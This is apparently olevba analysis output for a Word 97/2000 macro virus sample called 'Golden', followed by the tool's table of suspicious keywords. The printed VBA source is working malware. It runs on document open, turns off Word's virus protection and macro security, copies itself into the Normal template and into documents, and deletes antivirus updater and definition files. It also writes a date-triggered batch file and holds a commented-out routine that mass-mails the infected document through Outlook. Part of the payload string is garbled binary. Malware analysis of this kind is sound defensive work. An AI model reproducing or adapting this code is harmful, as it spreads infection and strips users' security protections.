olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Golden-31dafc161b7f731ef6154d4fbcc62d2dbb833d96
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Golden-31dafc161b7f731ef6154d4fbcc62d2dbb833d96 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub document_open()
'///////////////////////////\°°°°°°°°°°°°°°°°°/\\\\\\\\\\\\\\\\\\\\\\\\\\\\'
'////////////////////////////Golden v1.0 by doc\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'
'**************************************************************************'

'                            || ERROR ROUTINE ||
On Error Resume Next

'--------------------------------------------------------------------------



'                || GLOBAL INFECTION VARIABLE DEFINITION ||
Dim SysDate

Set Chr32NT = NormalTemplate.VBProject
Set Chr32AD = ActiveDocument.VBProject
Set Chr32O = Options

'---------------------------------------------------------------------------

'                            || AnTI MACRO WARNINGs ||

'W97:
    
    Chr32O.VirusProtection = False

'W2K:
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
    CommandBars("Tools").Controls("Macro").Enabled = False

'Binding
    
    KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=wdKeyCategoryFont, Command:=" "
    Application.CommandBars("Tools").Controls(12).Visible = False
'----------------------------------------------------------------------------

'                          || OUTLOOK MAIL ROUTINE ||

'If Dir("c:\autoexec.doc") <> " " Then
'MsgBox "You Have New Mail"
'Dim UDO, DMN, BUA
'Set UDO = CreateObject("Outlook.Application")
'Set DMN = UDO.GetNameSpace("MAPI")

'If UDO = "Outlook" Then
'DMN.Logon "profile", "password"
 '  For y = 1 To DMN.AddressLists.Count
  '    Set AddyBook = DMN.AddressLists(y)
   '  x = 1
    ' Set BUA = UDO.CreateItem(0)
     'For oo = 1 To AddyBook.AddressEntries.Count
'         Peep = AddyBook.AddressEntries(x)
 '         BUA.Recipients.Add Peep
  '        x = x + 1
   '       If x > 40 Then oo = AddyBook.AddressEntries.Count
'      Next oo
 '     BUA.Subject = "Important Message From " & Application.UserName
  '    BUA.Body = "Read this, important! I'll see you later, bye"
   '   BUA.Attachments.Add ActiveDocument.FullName
    '  BUA.Send
     '   Peep = ""
   ' Next y
'DMN.Logoff
'Open ("c:\autoexec.doc") For Output As #31337
'Close #31337
'End If
'----------------------------------------------------------------------------


'                                           || INFECTION ||



 c = Chr32NT.vbcomponents(1).CodeModule.CountOfLines
 g = Chr32AD.vbcomponents(1).CodeModule.CountOfLines
If c = 146 And g = 146 Then GoTo AvCheck
If c = 146 Then

    Chr32AD.vbcomponents(1).CodeModule.DeleteLines 1, Chr32AD.vbcomponents(1).CodeModule.CountOfLines
    FullCode = Chr32NT.vbcomponents(1).CodeModule.Lines(1, Chr32NT.vbcomponents(1).CodeModule.CountOfLines)
    Chr32AD.vbcomponents(1).CodeModule.AddFromString (FullCode)
End If
If g >= 144 Then
    Chr32NT.vbcomponents(1).CodeModule.DeleteLines 1, Chr32NT.vbcomponents(1).CodeModule.CountOfLines
    FullCode = Chr32AD.vbcomponents(1).CodeModule.Lines(1, Chr32AD.vbcomponents(1).CodeModule.CountOfLines)
    Chr32NT.vbcomponents(1).CodeModule.AddFromString (FullCode)
End If



'-----------------------------------------------------------------------------


'                                           || AV KILL ||

AvCheck:
'avp
 If Dir("C:\Program Files\AVP Shared Files\avpupd.exe") <> "" Then Kill ("C:\Program Files\AVP Shared Files\avpupd.exe")
 If Dir("C:\Programme\AVP Shared Files\avpupd.exe") <> "" Then Kill ("C:\Programme\AVP Shared Files\avpupd.exe")

 If Dir("C:\Program Files\AntiViral Toolkit Pro\gk95.vxd") <> "" Then Kill ("C:\Program Files\AntiViral Toolkit Pro\gk95.vxd")
 If Dir("C:\Programme\AntiViral Toolkit Pro\gk95.vxd") <> "" Then Kill ("C:\Programme\AntiViral Toolkit Pro\gk95.vxd")

 If Dir("C:\PROGRAM FILES\AntiViral Toolkit Pro\macro.avc") <> "" Then Open ("C:\PROGRAM FILES\AntiViral Toolkit Pro\macro.avc") For Output As #1
 If Dir("C:\PROGRAMme\AntiViral Toolkit Pro\macro.avc") <> "" Then Open ("C:\PROGRAMme\AntiViral Toolkit Pro\macro.avc") For Output As #2
Close #1
Close #2

'f-prot
 If Dir("C:\F-PROT\Macro.def") <> "" Then Kill ("C:\F-PROT\Macro.def")

'norton
 If Dir("C:\Programme\Norton AntiVirus\NavLu32.exe") <> "" Then Kill ("C:\Programme\Norton AntiVirus\NavLu32.exe")
 If Dir("C:\PROGRAM FILES\Norton AntiVirus\NavLu32.exe") <> "" Then Kill ("C:\PROGRAM FILES\Norton AntiVirus\NavLu32.exe")

 If Dir("C:\PROGRAM FILES\Norton AntiVirus\Rescue.exe") <> "" Then Kill ("C:\PROGRAM FILES\Norton AntiVirus\Rescue.exe")
 If Dir("C:\Programme\Norton AntiVirus\Rescue.exe") <> "" Then Kill ("C:\Programme\Norton AntiVirus\Rescue.exe")

'-------------------------------------------------------------------------------


'                                          || PAYLOAD ||


Payload:

If Day(Now) = 31 Then
    Open ("c:\windows\winstart.bat") For Input As #13
        Print #13, "@echo off"
        Print #13, "echo ----------------------------WARNING----------------------------"
        Print #13, "echo 31337 d0c HAS FOUND A VIRUS ; W97M / W2KM.GOLDEN;  ON YOUR SYSTEM"
        Print #13, "echo Maike, I l0v3 ya ;-)"
        Print #13, "echo GOLDEN v1.0 (C) 1999 by doc"
        Print #13, "echo 6:ҐҐ]БхењћSнО<мєѕW\Jј?Љ¶Hf\h”gy‡·в`
*O
SнО<мєѕW\Jј?Љ¶Hf\h”gy‡·в`
*O
SнО<мєѕW\Jј?Љ¶Hf\h”gy‡·в`
*O
SнО<мєѕW\Jј?Љ¶Hf\h”gy‡·в`
*O
Ьµ.љUUг)™Б•ЭоА
Т
}љ±рkep4хГZ†T#нБхsZ"
        Print #13, "pause"
        Print #13, "del c:\windows\winstart.bat"
Close #13
        MsgBox "Your infected with the GOLDEN Virus (C)1999 by doc"
End If
'End If

'Word 97/2000 Virus |GOLDEN| v1.0 (c) 1999 by doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|KILL                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |avpupd.exe          |Executable file name                         |
|IOC       |NavLu32.exe         |Executable file name                         |
|IOC       |Rescue.exe          |Executable file name                         |
|IOC       |winstart.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
